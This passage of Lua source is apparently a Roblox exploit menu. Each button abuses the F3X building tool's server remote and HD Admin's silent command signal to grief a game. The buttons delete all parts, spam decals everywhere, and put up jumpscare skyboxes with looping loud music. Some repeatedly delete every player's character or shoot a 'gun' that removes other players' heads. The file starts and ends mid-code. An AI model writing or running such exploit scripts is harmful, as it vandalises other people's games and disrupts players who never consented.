    Name = "Delete Skybox",
    Callback = function()
        local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

local tool
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then tool = v.Parent end
end
for _, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then tool = v.Parent end
end

local remote = tool.SyncAPI.ServerEndpoint
local function _(args)
    remote:InvokeServer(unpack(args))
end

local function DeletePart(part)
    _({"Remove", {part}})
end

local ids = {
    ["rbxassetid://111891702759441"] = true,
    ["rbxassetid://8006679977"] = true
}

for _, v in workspace:GetDescendants() do
    if v:IsA("BasePart") then
        local mesh = v:FindFirstChildOfClass("SpecialMesh")
        if mesh and ids[mesh.MeshId] then
            DeletePart(v)
        end
    end
end
        
    end
})
AddButton({
    Name = "Spin Sky by 1x9",
    Callback = function()
-- MADE BY 1X9 BUT I MODIFIED SO IT SPINS THE CURRENT SKYBOX
        local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local tool
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then tool = v.Parent end
end
for _, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then tool = v.Parent end
end

local SyncAPI = tool.SyncAPI
local function _(args)
    SyncAPI:Invoke(unpack(args))
end

local function SyncRotate(part, cf)
    _( { "SyncRotate", { { Part = part, CFrame = cf } } } )
end

local ids = {
    ["rbxassetid://111891702759441"] = true,
    ["rbxassetid://8006679977"] = true
}

local target
for _, v in workspace:GetDescendants() do
    if v:IsA("BasePart") then
        local mesh = v:FindFirstChildOfClass("SpecialMesh")
        if mesh and ids[mesh.MeshId] then
            target = v
            break
        end
    end
end

if not target then return end

local base = target.CFrame
local angle = 0
local speed = math.rad(60)

RunService.Heartbeat:Connect(function(dt)
    if not target or not target.Parent then return end
    angle += speed * dt
    local cf = base * CFrame.Angles(angle, angle, angle)
    SyncRotate(target, cf)
    target.CFrame = cf
end)
    end
})
AddButton({
    Name = "Remove Decals",
    Callback = function()
        local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local tool

-- Find the SyncAPI tool
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

for _, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint

local function _(args)
    remote:InvokeServer(unpack(args))
end

-- Function to remove all textures/decals
function RemoveSpam()
    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") then
            spawn(function()
                -- Unlock the part so it can be modified
                local argsUnlock = {"SetLocked", {v}, false}
                _(argsUnlock)

                -- Remove all textures/decals from the part
                for _, child in ipairs(v:GetChildren()) do
                    if child:IsA("Decal") or child:IsA("Texture") then
                        local argsRemove = {"Remove", {child}}
                        _(argsRemove)
                    end
                end
            end)
        end
    end
end

-- Run the cleanup
RemoveSpam()
    end
})
AddButton({
    Name = "Obama jumpscare",
    Callback = function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local backpack = player.Backpack

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	return nil
end

local f3x = getf3x()
if not f3x then
	warn("You don't have F3X")
	return
end

local syncapi = f3x.SyncAPI
local serverendpoint = syncapi.ServerEndpoint

local function delete(part)
	serverendpoint:InvokeServer("Remove", {part})
end

local function deleteall()
	for _, v in ipairs(workspace:GetDescendants()) do
		if v:IsA("BasePart") or v:IsA("UnionOperation") or v:IsA("Model") then
			task.spawn(function()
				delete(v)
			end)
		end
	end
end

deleteall()

SilentRequest:InvokeServer(";fogcolor black")
SilentRequest:InvokeServer(";time 6")
SilentRequest:InvokeServer(";music 116261678102978 ;pitch 0.13 ;volume inf")

local function CreateSkybox()
	local hrp = player.Character:WaitForChild("HumanoidRootPart")
	serverendpoint:InvokeServer("CreatePart", "Normal", hrp.CFrame + Vector3.new(0, 6, 0), workspace)

	local skyPart
	for i = 1, 50 do
		task.wait()
		for _, v in ipairs(workspace:GetChildren()) do
			if v:IsA("BasePart") and (v.Position - (hrp.Position + Vector3.new(0, 6, 0))).Magnitude < 2 then
				skyPart = v
				break
			end
		end
		if skyPart then break end
	end
	if not skyPart then
		warn("Skybox part not created")
		return
	end

	serverendpoint:InvokeServer("SyncAnchor", {{Part = skyPart, Anchored = true}})
	serverendpoint:InvokeServer("CreateMeshes", {{Part = skyPart}})
	serverendpoint:InvokeServer("SyncMesh", {{Part = skyPart, MeshId = "rbxassetid://111891702759441"}})
	serverendpoint:InvokeServer("SyncMesh", {{Part = skyPart, Scale = Vector3.new(109888, 109888, 109888)}})
	serverendpoint:InvokeServer("SyncTransparency", {{Part = skyPart, Transparency = 0}})
	serverendpoint:InvokeServer("SyncMesh", {{Part = skyPart, VertexColor = Vector3.new(3, 3, 3)}})

	local imgs = {
		"http://www.roblox.com/asset/?id=14439093265",
		"http://www.roblox.com/asset/?id=5151897861",
		"http://www.roblox.com/asset/?id=112240697299854",
		"http://www.roblox.com/asset/?id=8842642562"
	}

	local function SetTex(id)
		serverendpoint:InvokeServer("SyncMesh", {{Part = skyPart, TextureId = id}})
	end

	SetTex(imgs[1])
	task.wait(5)
	SetTex(imgs[2])
	task.wait(4)

	SetTex(imgs[3])
	task.wait(7)

	while skyPart and skyPart.Parent do
		SetTex(imgs[4])
		task.wait(0.5)
		SetTex(imgs[3])
		task.wait(2)
	end
end

task.spawn(CreateSkybox)

local tool
for i, v in player:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end

for i, v in game.ReplicatedStorage:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)
	remote:InvokeServer(unpack(args))
end

function DestroyPart(part)
	local args = {
		[1] = "Remove",
		[2] = {
			[1] = part
		}
	}
	_(args)
end

function Punish(player)
	local char = player.Character
	DestroyPart(char)
end

coroutine.wrap(function()
	while true do
		for i, v in game.Players:GetPlayers() do
			pcall(function()
				Punish(v)
			end)
		end
		task.wait(0.0)
	end
end)()
        
    end
})
AddButton({
    Name = "Uzi",
    Callback = function()
       --========================================================
--== SERVICES
--========================================================
local RS = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local hum = char:WaitForChild("Humanoid")
local camera = workspace.CurrentCamera

--========================================================
--== FIND SYNC TOOL
--========================================================
local tool
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then tool = v.Parent end
end
for _, v in RS:GetDescendants() do
    if v.Name == "SyncAPI" then tool = v.Parent end
end

if not tool then
    warn("NO SYNCAPI TOOL FOUND")
    return
end

local remote = tool.SyncAPI.ServerEndpoint
local function Sync(args)
    return remote:InvokeServer(unpack(args))
end

--========================================================
--== SYNC HELPERS
--========================================================
local function CreatePart(cf, parent) return Sync({"CreatePart","Normal",cf,parent}) end
local function Move(p, cf) return Sync({"SyncMove",{{Part=p,CFrame=cf}}}) end
local function Color(p,c) return Sync({"SyncColor",{{Part=p,Color=c}}}) end
local function Trans(p,t) return Sync({"SyncMaterial",{{Part=p,Transparency=t}}}) end
local function NoCollide(p) return Sync({"SyncCollision",{{Part=p,CanCollide=false}}}) end
local function Anchor(p,b) return Sync({"SyncAnchor",{{Part=p,Anchored=b}}}) end
local function AddMesh(p) return Sync({"CreateMeshes",{{Part=p}}}) end
local function MeshScale(p,scale) return Sync({"SyncMesh",{{Part=p,Scale=scale}}}) end
local function MeshApply(p,id) return Sync({"SyncMesh",{{Part=p,MeshId="rbxassetid://"..id}}}) end
local function Destroy(p) return Sync({"Remove",{[1]=p}}) end
local function Weld(p1,p2,lead) return Sync({"CreateWelds",{p1,p2},lead}) end

--========================================================
--== CREATE GUN PART
--========================================================
local Gun = CreatePart(CFrame.new(0,5,0),char)
AddMesh(Gun)
MeshApply(Gun,"4468300591")
MeshScale(Gun,Vector3.new(0.015,0.015,0.015))
Color(Gun,Color3.new(0,0,0))
Trans(Gun,0)
NoCollide(Gun)
Anchor(Gun,false)

--========================================================
--== PERFECT HAND WRIST WELD
--========================================================
local hand = char:FindFirstChild("RightHand") or char:FindFirstChild("Right Arm")
if hand then
    Anchor(Gun, true)

    -- PERFECT tool-style offset
    local offset =
        CFrame.new(0, -0.1, -0.55) *   -- forward in palm
        CFrame.Angles(math.rad(90), 0, 0)

    local targetCF = hand.CFrame * offset
    Move(Gun, targetCF)

    Weld(Gun, hand, Gun)

    task.wait(0.05)
    Anchor(Gun, false)
    Gun.Massless = true
end

--========================================================
--== TOOL SETUP
--========================================================
local GunTool = Instance.new("Tool")
GunTool.RequiresHandle = false
GunTool.Name = "Gravity Gun"
GunTool.Parent = player.Backpack

local SFX = Instance.new("Sound", Gun)
SFX.SoundId = "rbxassetid://1255794"
SFX.Volume = 1

--========================================================
--== BULLET SETTINGS
--========================================================
local SPEED = 350
local LIFE = 2.5
local RADIUS = 5

--========================================================
--== KILL ONLY HEAD
--========================================================
local function KillChar(c)
    local h = c:FindFirstChild("Head")
    if h then Destroy(h) end
end

--========================================================
--== BULLET POOL
--========================================================
local BulletPool = {}
local MaxBullets = 40

local function GetBullet()
    for _, b in ipairs(BulletPool) do
        if not b.Active then
            b.Active = true
            return b
        end
    end

    local p = CreatePart(CFrame.new(0,1000,0),char)
    AddMesh(p)
    MeshScale(p,Vector3.new(0.2,0.2,0.5))
    Color(p,Color3.new(1,1,0))
    NoCollide(p)
    Anchor(p,false)

    local obj = {Part=p, Active=true, SpawnTime=0, Dir=nil}
    table.insert(BulletPool,obj)
    return obj
end

--========================================================
--== SHOOT FUNCTION
--========================================================
local function Fire(target)
    SFX:Play()

    local bullet = GetBullet()
    bullet.SpawnTime = tick()
    bullet.Dir = (target - Gun.Position).Unit

    Move(bullet.Part, CFrame.new(Gun.Position, Gun.Position + bullet.Dir))

    task.spawn(function()
        while bullet.Active do
            local dt = RunService.Heartbeat:Wait()
            local cf = bullet.Part.CFrame + bullet.Dir * (SPEED * dt)
            Move(bullet.Part, cf)

            for _, plr in ipairs(Players:GetPlayers()) do    
                if plr ~= player and plr.Character then    
                    local head = plr.Character:FindFirstChild("Head")    
                    if head and (head.Position - bullet.Part.Position).Magnitude <= RADIUS then    
                        KillChar(plr.Character)    
                        bullet.Active = false    
                        break    
                    end    
                end    
            end    

            if tick() - bullet.SpawnTime > LIFE then    
                bullet.Active = false    
            end    
        end    
        Move(bullet.Part, CFrame.new(0,99999,0))
    end)
end

--========================================================
--== MOBILE HOLD TO FIRE
--========================================================
local firing = false
local touchPos = nil

UIS.TouchStarted:Connect(function(t)
    firing = true
    touchPos = t.Position

    task.spawn(function()
        while firing do
            if touchPos then
                local ray = camera:ScreenPointToRay(touchPos.X, touchPos.Y)
                local hit = workspace:Raycast(ray.Origin, ray.Direction * 999)
                Fire(hit and hit.Position or ray.Origin + ray.Direction * 999)
            end
            RunService.RenderStepped:Wait()
        end
    end)
end)

UIS.TouchMoved:Connect(function(t)
    touchPos = t.Position
end)

UIS.TouchEnded:Connect(function()
    firing = false
    touchPos = nil
end)

--========================================================
--== PC FIRE
--========================================================
GunTool.Activated:Connect(function()
    local ray = camera:ScreenPointToRay(camera.ViewportSize.X/2, camera.ViewportSize.Y/2)
    local hit = workspace:Raycast(ray.Origin, ray.Direction * 999)
    Fire(hit and hit.Position or ray.Origin + ray.Direction * 999)
end)
    end
})
AddButton({
    Name = "Hd skybox current sky",
    Callback = function()
        local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

local tool
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end
for _, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint
local function _(args)
    remote:InvokeServer(unpack(args))
end

-- table that tracks EXACT parts so we never apply twice
local processed = {}

local function SetVertexColorOnce(part, color)
    if processed[part] then
        return   -- already done, do NOTHING
    end
    processed[part] = true

    _({"SyncMesh", {{Part = part, VertexColor = color}}})
end

local ids = {
    ["rbxassetid://111891702759441"] = Vector3.new(3, 3, 3),
    ["rbxassetid://8006679977"]      = Vector3.new(3, 3, 3)
}

for _, v in workspace:GetDescendants() do
    if v:IsA("BasePart") then
        local mesh = v:FindFirstChildOfClass("SpecialMesh")
        if mesh and ids[mesh.MeshId] then
            SetVertexColorOnce(v, ids[mesh.MeshId])
        end
    end
end
    end
})
AddButton({
    Name = "Mario.exe",
    Callback = function()
        -- HD Admin Commands
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
SilentRequest:InvokeServer(";unfog")
SilentRequest:InvokeServer(";fogcolor black")
SilentRequest:InvokeServer(";time 0")

-- SyncAPI Setup
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

local tool
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

for _, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint

-- SyncAPI Functions
local function _(args)
    remote:InvokeServer(unpack(args))
end

local function CreatePart(cf, parent)
    _({"CreatePart", "Normal", cf, parent})
end

local function SetAnchor(part, state)
    _({"SyncAnchor", {{Part = part, Anchored = state}}})
end

local function SetCollision(part, state)
    _({"SyncCollision", {{Part = part, CanCollide = state}}})
end

local function AddMesh(part)
    _({"CreateMeshes", {{Part = part}}})
end

local function SetMesh(part, meshid)
    _({"SyncMesh", {{Part = part, MeshId = "rbxassetid://" .. meshid}}})
end

local function SetTexture(part, texid)
    _({"SyncMesh", {{Part = part, TextureId = "rbxassetid://" .. texid}}})
end

local function MeshResize(part, size)
    _({"SyncMesh", {{Part = part, Scale = size}}})
end

local function SetLocked(part, state)
    _({"SetLocked", {part}, state})
end

local function SpawnDecal(part, side)
    _({"CreateTextures", {{Part = part, Face = side, TextureType = "Decal"}}})
end

local function AddDecal(part, asset, side)
    _({"SyncTexture", {{Part = part, Face = side, TextureType = "Decal", Texture = "rbxassetid://" .. asset}}})
end

local function SetVertexColor(part, color)
    _({"SyncMesh", {{Part = part, VertexColor = color}}})
end

-- Giant Sky Function (65000-70000 scale)
local function GiantSky(id)
    local hrp = char:WaitForChild("HumanoidRootPart")
    local cf = hrp.CFrame
    local pos = cf.Position + Vector3.new(0, 6, 0)
    CreatePart(CFrame.new(pos), workspace)
    task.wait(0.3)

    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") and (v.Position - pos).Magnitude < 1 then
            SetAnchor(v, true)
            AddMesh(v)
            SetMesh(v, "111891702759441") -- sphere mesh
            SetTexture(v, id)
            SetVertexColor(v, Vector3.new(4, 4, 4)) -- vertex color
            MeshResize(v, Vector3.new(109888, 109888, 109888)) -- massive scale
            SetCollision(v, false)
            SetLocked(v, true)
        end
    end
end

-- Spam Function
local function Spam(id)
    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") then
            task.spawn(function()
                SetLocked(v, false)
                for _, side in ipairs(Enum.NormalId:GetEnumItems()) do
                    SpawnDecal(v, side)
                    AddDecal(v, id, side)
                end
            end)
        end
    end
end

-- Execute (Decal spam first, then skybox)
Spam("137939198058148") -- spam decals first
GiantSky("7860826670") -- giant skybox second
local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 18379039436")
SilentRequest:InvokeServer(";volume inf")

end
})
AddButton({
    Name = "Meh Irl",
    Callback = function()
        -- HD Admin Commands
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
SilentRequest:InvokeServer(";unfog")
SilentRequest:InvokeServer(";fogcolor black")
SilentRequest:InvokeServer(";time 0")

-- SyncAPI Setup
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

local tool
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

for _, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint

-- SyncAPI Functions
local function _(args)
    remote:InvokeServer(unpack(args))
end

local function CreatePart(cf, parent)
    _({"CreatePart", "Normal", cf, parent})
end

local function SetAnchor(part, state)
    _({"SyncAnchor", {{Part = part, Anchored = state}}})
end

local function SetCollision(part, state)
    _({"SyncCollision", {{Part = part, CanCollide = state}}})
end

local function AddMesh(part)
    _({"CreateMeshes", {{Part = part}}})
end

local function SetMesh(part, meshid)
    _({"SyncMesh", {{Part = part, MeshId = "rbxassetid://" .. meshid}}})
end

local function SetTexture(part, texid)
    _({"SyncMesh", {{Part = part, TextureId = "rbxassetid://" .. texid}}})
end

local function MeshResize(part, size)
    _({"SyncMesh", {{Part = part, Scale = size}}})
end

local function SetLocked(part, state)
    _({"SetLocked", {part}, state})
end

local function SpawnDecal(part, side)
    _({"CreateTextures", {{Part = part, Face = side, TextureType = "Decal"}}})
end

local function AddDecal(part, asset, side)
    _({"SyncTexture", {{Part = part, Face = side, TextureType = "Decal", Texture = "rbxassetid://" .. asset}}})
end

local function SetVertexColor(part, color)
    _({"SyncMesh", {{Part = part, VertexColor = color}}})
end

-- Giant Sky Function (65000-70000 scale)
local function GiantSky(id)
    local hrp = char:WaitForChild("HumanoidRootPart")
    local cf = hrp.CFrame
    local pos = cf.Position + Vector3.new(0, 6, 0)
    CreatePart(CFrame.new(pos), workspace)
    task.wait(0.3)

    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") and (v.Position - pos).Magnitude < 1 then
            SetAnchor(v, true)
            AddMesh(v)
            SetMesh(v, "111891702759441") -- sphere mesh
            SetTexture(v, id)
            SetVertexColor(v, Vector3.new(4, 4, 4)) -- vertex color
            MeshResize(v, Vector3.new(109888, 109888, 109888)) -- massive scale
            SetCollision(v, false)
            SetLocked(v, true)
        end
    end
end

-- Spam Function
local function Spam(id)
    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") then
            task.spawn(function()
                SetLocked(v, false)
                for _, side in ipairs(Enum.NormalId:GetEnumItems()) do
                    SpawnDecal(v, side)
                    AddDecal(v, id, side)
                end
            end)
        end
    end
end

-- Execute (Decal spam first, then skybox)
Spam("92730331106137") -- spam decals first
GiantSky("72082001310967") -- giant skybox second
end
})
AddButton({
    Name = "Team FAT",
    Callback = function()
        -- HD Admin Commands
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
SilentRequest:InvokeServer(";unfog")
SilentRequest:InvokeServer(";fogcolor black")
SilentRequest:InvokeServer(";time 0")

-- SyncAPI Setup
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

local tool
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

for _, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint

-- SyncAPI Functions
local function _(args)
    remote:InvokeServer(unpack(args))
end

local function CreatePart(cf, parent)
    _({"CreatePart", "Normal", cf, parent})
end

local function SetAnchor(part, state)
    _({"SyncAnchor", {{Part = part, Anchored = state}}})
end

local function SetCollision(part, state)
    _({"SyncCollision", {{Part = part, CanCollide = state}}})
end

local function AddMesh(part)
    _({"CreateMeshes", {{Part = part}}})
end

local function SetMesh(part, meshid)
    _({"SyncMesh", {{Part = part, MeshId = "rbxassetid://" .. meshid}}})
end

local function SetTexture(part, texid)
    _({"SyncMesh", {{Part = part, TextureId = "rbxassetid://" .. texid}}})
end

local function MeshResize(part, size)
    _({"SyncMesh", {{Part = part, Scale = size}}})
end

local function SetLocked(part, state)
    _({"SetLocked", {part}, state})
end

local function SpawnDecal(part, side)
    _({"CreateTextures", {{Part = part, Face = side, TextureType = "Decal"}}})
end

local function AddDecal(part, asset, side)
    _({"SyncTexture", {{Part = part, Face = side, TextureType = "Decal", Texture = "rbxassetid://" .. asset}}})
end

local function SetVertexColor(part, color)
    _({"SyncMesh", {{Part = part, VertexColor = color}}})
end

-- Giant Sky Function (65000-70000 scale)
local function GiantSky(id)
    local hrp = char:WaitForChild("HumanoidRootPart")
    local cf = hrp.CFrame
    local pos = cf.Position + Vector3.new(0, 6, 0)
    CreatePart(CFrame.new(pos), workspace)
    task.wait(0.3)

    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") and (v.Position - pos).Magnitude < 1 then
            SetAnchor(v, true)
            AddMesh(v)
            SetMesh(v, "111891702759441") -- sphere mesh
            SetTexture(v, id)
            SetVertexColor(v, Vector3.new(4, 4, 4)) -- vertex color
            MeshResize(v, Vector3.new(109888, 109888, 109888)) -- massive scale
            SetCollision(v, false)
            SetLocked(v, true)
        end
    end
end

-- Spam Function
local function Spam(id)
    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") then
            task.spawn(function()
                SetLocked(v, false)
                for _, side in ipairs(Enum.NormalId:GetEnumItems()) do
                    SpawnDecal(v, side)
                    AddDecal(v, id, side)
                end
            end)
        end
    end
end

-- Execute (Decal spam first, then skybox)
Spam("13579585726") -- spam decals first
GiantSky("13579585726") -- giant skybox second
end
})
AddButton({
    Name = "WT sky",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";fogcolor black ;time 0")
        
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

local tool
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

for _, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)
    remote:InvokeServer(unpack(args))
end

function CreatePart(cf, parent)
    _({"CreatePart", "Normal", cf, parent})
end

function SetAnchor(part, state)
    _({"SyncAnchor", {{["Part"] = part, ["Anchored"] = state}}})
end

function AddMesh(part)
    _({"CreateMeshes", {{["Part"] = part}}})
end

function SetMesh(part, meshid)
    _({"SyncMesh", {{["Part"] = part, ["MeshId"] = "rbxassetid://" .. meshid}}})
end

function SetTexture(part, texid)
    _({"SyncMesh", {{["Part"] = part, ["TextureId"] = "rbxassetid://" .. texid}}})
end

function MeshResize(part, size)
    _({"SyncMesh", {{["Part"] = part, ["Scale"] = size}}})
end

function SetVertexColor(part, color)
    _({"SyncMesh", {{["Part"] = part, ["VertexColor"] = color}}})
end

function Sky(id)
    local hrp = char:WaitForChild("HumanoidRootPart")
    local cf = hrp.CFrame
    
    CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)
    
    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") and v.Position == cf.Position + Vector3.new(0, 6, 0) then
            SetAnchor(v, true)
            AddMesh(v)
            SetMesh(v, "111891702759441")
            SetTexture(v, id)
            SetVertexColor(v, Vector3.new(5, 5, 5))
            MeshResize(v, Vector3.new(109888, 109888, 109888))
        end
    end
end

-- Usage
Sky("138982388144695")
    end
})
AddButton({
    Name = "WT Decal",
    Callback = function()
        local player = game.Players.LocalPlayer

local char = player.Character or player.CharacterAdded:Wait()

local tool

for _, v in player:GetDescendants() do

	if v.Name == "SyncAPI" then		tool = v.Parent

	end

end

for _, v in game.ReplicatedStorage:GetDescendants() do

	if v.Name == "SyncAPI" then

		tool = v.Parent

	end

end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)

	remote:InvokeServer(unpack(args))

end

function SetCollision(part, boolean)

	local args = {

		"SyncCollision",

		{

			{

				Part = part,

				CanCollide = boolean

			}

		}

	}

	_(args)

end

function SetAnchor(boolean, part)

	local args = {

		"SyncAnchor",

		{

			{

				Part = part,

				Anchored = boolean

			}

		}

	}

	_(args)

end

function CreatePart(cf, parent)

	local args = {

		"CreatePart",

		"Normal",

		cf,

		parent

	}

	_(args)

end

function DestroyPart(part)

	local args = {

		"Remove",

		{ part }

	}

	_(args)

end

function MovePart(part, cf)

	local args = {

		"SyncMove",

		{

			{

				Part = part,

				CFrame = cf

			}

		}

	}

	_(args)

end

function Resize(part, size, cf)

	local args = {

		"SyncResize",

		{

			{

				Part = part,

				CFrame = cf,

				Size = size

			}

		}

	}

	_(args)

end

function AddMesh(part)

	local args = {

		"CreateMeshes",

		{

			{ Part = part }

		}

	}

	_(args)

end

function SetMesh(part, meshid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				MeshId = "rbxassetid://" .. meshid

			}

		}

	}

	_(args)

end

function SetTexture(part, texid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				TextureId = "rbxassetid://" .. texid

			}

		}

	}

	_(args)

end

function SetName(part, name)

	local args = {

		"SetName",

		{ part },

		name

	}

	_(args)

end

function MeshResize(part, size)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				Scale = size

			}

		}

	}

	_(args)

end

function Weld(part1, part2, lead)

	local args = {

		"CreateWelds",

		{ part1, part2 },

		lead

	}

	_(args)

end

function SetLocked(part, boolean)

	local args = {

		"SetLocked",

		{ part },

		boolean

	}

	_(args)

end

function SetTrans(part, transparency)

	local args = {

		"SyncMaterial",

		{

			{

				Part = part,

				Transparency = transparency

			}

		}

	}

	_(args)

end

function CreateSpotlight(part)

	local args = {

		"CreateLights",

		{

			{

				Part = part,

				LightType = "SpotLight"

			}

		}

	}

	_(args)

end

function SyncLighting(part, brightness)

	local args = {

		"SyncLighting",

		{

			{

				Part = part,

				LightType = "SpotLight",

				Brightness = brightness

			}

		}

	}

	_(args)

end

function Color(part, color)

	local args = {

		"SyncColor",

		{

			{

				Part = part,

				Color = color,

				UnionColoring = false

			}

		}

	}

	_(args)

end

function SpawnDecal(part, side)

	local args = {

		"CreateTextures",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal"

			}

		}

	}

	_(args)

end

function AddDecal(part, asset, side)

	local args = {

		"SyncTexture",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal",

				Texture = "rbxassetid://" .. asset

			}

		}

	}

	_(args)

end

function spam(id)

	for _, v in workspace:GetDescendants() do

		if v:IsA("BasePart") then

			spawn(function()

				SetLocked(v, false)

				for _, side in ipairs(Enum.NormalId:GetEnumItems()) do

					SpawnDecal(v, side)

					AddDecal(v, id, side)

				end

			end)

		end

	end

end

spam("138982388144695")
    end
})
AddButton({
    Name = "Realm v4",
    Callback = function()
       
-- SERVICES
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local backpack = player:WaitForChild("Backpack")

-- GIVE BTOOLS + PUNISH ALL
pcall(function()
    local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    RequestCommand:InvokeServer(";btools me")
    task.wait(0.4)
    RequestCommand:InvokeServer(";punish all")
end)

-- F3X FUNCTIONS
local function getf3x()
    for _, v in ipairs(backpack:GetChildren()) do
        if v:FindFirstChild("SyncAPI") then return v end
    end
    for _, v in ipairs(char:GetChildren()) do
        if v:FindFirstChild("SyncAPI") then return v end
    end
end

local f3x = getf3x()
if not f3x then warn("No F3X found") return end
local endpoint = f3x.SyncAPI.ServerEndpoint

local function fastInvoke(args)
    task.spawn(function()
        pcall(function()
            endpoint:InvokeServer(unpack(args))
        end)
    end)
end

local function resize(p,s,cf) fastInvoke({"SyncResize",{{Part=p,CFrame=cf,Size=s}}}) end
local function material(p,m) fastInvoke({"SyncMaterial",{{Part=p,Material=m}}}) end
local function color(p,c) fastInvoke({"SyncColor",{{Part=p,Color=c,UnionColoring=false}}}) end
local function transparency(p,t) fastInvoke({"SyncMaterial",{{Part=p,Transparency=t}}}) end
local function mesh(p,id,tex,scale)
    fastInvoke({"CreateMeshes",{{Part=p}}})
    if id then fastInvoke({"SyncMesh",{{Part=p,MeshId="rbxassetid://"..id}}}) end
    if tex then fastInvoke({"SyncMesh",{{Part=p,TextureId="rbxassetid://"..tex}}}) end
    if scale then fastInvoke({"SyncMesh",{{Part=p,Scale=scale}}}) end
end
local function setLock(p) fastInvoke({"SetLocked",{p},true}) end
local function setCollision(p,b) fastInvoke({"SyncCollision",{{Part=p,CanCollide=b}}}) end
local function createDecal(p,f) fastInvoke({"CreateTextures",{{Part=p,Face=f,TextureType="Decal"}}}) end
local function setDecal(p,f,id)
    fastInvoke({"SyncTexture",{{Part=p,Face=f,TextureType="Decal",Texture="rbxassetid://"..id}}})
end

local function quickPart(t,cf,size,mat,col,trans,mid,mtex,mscale,extra)
    task.spawn(function()
        local p = endpoint:InvokeServer("CreatePart",t,cf,workspace.Terrain)
        if not p then return end
        resize(p,size,cf)
        if mat then material(p,mat) end
        if col then color(p,col) end
        if trans then transparency(p,trans) end
        if mid or mtex or mscale then mesh(p,mid,mtex,mscale) end
